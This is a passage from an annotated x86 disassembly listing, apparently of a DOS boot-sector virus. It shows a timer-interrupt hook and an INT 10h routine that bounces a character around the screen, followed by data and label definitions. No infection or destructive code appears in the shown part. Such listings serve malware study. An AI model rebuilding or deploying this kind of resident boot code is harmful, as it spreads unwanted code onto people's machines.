L7F77:  CMP CX,L7FD1            ;7F77 3B 0E D1 7F
    JNZ L7F94               ;7F7B 75 17
    MOV AX,L7FCD        ;Sum vars   ;7F7D A1 CD 7F
    AND AL,7                ;7F80 24 07
    CMP AL,3                ;7F82 3C 03
    JNZ L7F8B               ;7F84 75 05
    XOR CH,0FF              ;7F86 80 F5 FF
    INC CH              ;7F89 FE C5
                        ;L7F8B    L7F84 CJ
L7F8B:  CMP AL,5                ;7F8B 3C 05
    JNZ L7F94               ;7F8D 75 05
    XOR CL,0FF              ;7F8F 80 F1 FF
    INC CL              ;7F92 FE C1
                        ;L7F94    L7F7B CJ  L7F8D CJ
L7F94:  ADD DL,CL               ;7F94 02 D1
    ADD DH,CH               ;7F96 02 F5
    MOV L7FD1,CX            ;7F98 89 0E D1 7F
    MOV L7FCF,DX            ;7F9C 89 16 CF 7F
    MOV AH,2                ;7FA0 B4 02
    INT 10              ;7FA2 CD 10
    MOV AH,8                ;7FA4 B4 08
    INT 10              ;7FA6 CD 10
    MOV L7FCD,AX        ;Sum vars   ;7FA8 A3 CD 7F
    MOV BL,AH               ;7FAB 8A DC
    CMP BYTE PTR L7FD3,1    ;Sum vars   ;7FAD 80 3E D3 7F 01
    JNZ L7FB6               ;7FB2 75 02
    MOV BL,83               ;7FB4 B3 83
                        ;L7FB6    L7FB2 CJ
L7FB6:  MOV CX,1                ;7FB6 B9 01 00
    MOV AX,907              ;7FB9 B8 07 09
    INT 10              ;7FBC CD 10
    POP DX              ;7FBE 5A
    MOV AH,2                ;7FBF B4 02
    INT 10              ;7FC1 CD 10
    POP DX              ;7FC3 5A
    POP CX              ;7FC4 59
    POP BX              ;7FC5 5B
    POP AX              ;7FC6 58
    POP DS              ;7FC7 1F
;   Jmp Far opcode
    DB  0EA             ;7FC8 EA
                        ;L7FC9    L7ED7 DW
OLD_TIMER_OFF   EQU $
    DW  TIMER_OFF           ;7FC9 20 00
                        ;L7FCB    L7EDA DW
OLD_TIMER_SEG   EQU $
    DW  L0000               ;7FCB 00 00
                        ;L7FCD    L7F34 DR  L7F7D DR  L7FA8 DW
;   Sum vars
L7FCD   DW  L0000               ;7FCD 00 00
                        ;L7FCF    L7F10 DW  L7F21 DR  L7F2E DR  L7F9C DW
L7FCF   DW  L0101               ;7FCF 01 01
                        ;L7FD1    L7F16 DW  L7F4A DR  L7F77 DT  L7F98 DW
L7FD1   DW  L0101               ;7FD1 01 01
                        ;L7FD3    L7F0C DW  L7F37 DT  L7FAD DT
;   Sum vars
L7FD3   DB  0               ;7FD3 00
                        ;L7FD4    L7EEC DT  L7EF2 DW
;   Sum vars
L7FD4   DW  LFFFF               ;7FD4 FF FF
                        ;L7FD6    L7EF8 DW  L7F6C DT
;   Sum vars
L7FD6   DB  50              ;7FD6 50
                        ;L8000    L7CC7 DI  L7E2D DR  L7E68 DM
L8000   EQU $+29
                        ;L8002    L7D63 DI
L8002   EQU $+2Bh
                        ;L800B    L7D8B DT
L800B   EQU $+34
                        ;L800D    L7D93 DT
L800D   EQU $+36
                        ;L800E    L7D9A DR
L800E   EQU $+37
                        ;L8010    L7D9E DR
L8010   EQU $+39
                        ;L8011    L7DAB DR
L8011   EQU $+3A
                        ;L8016    L7DA2 DR
L8016   EQU $+3F
                        ;L81BE    L7D40 DI
L81BE   EQU $+1E7
                        ;L81F5    L7D7D DR
L81F5   EQU $+21E
                        ;L81F9    L7D83 DR
L81F9   EQU $+222
                        ;L81FB    L7D76 DT
L81FB   EQU $+224
                        ;L81FC    L7D6E DT
L81FC   EQU $+225
                        ;L8307    L7F3E DI
L8307   EQU $+330
                        ;LFFC0    L7C66 DI
LFFC0   EQU $+7FE9
                        ;LFFF7    L7E51 DI
LFFF7   EQU $-7FE0
                        ;LFFFF    L7FD4 CI
LFFFF   EQU $-7FD8
    S0000   ENDS
;
END 
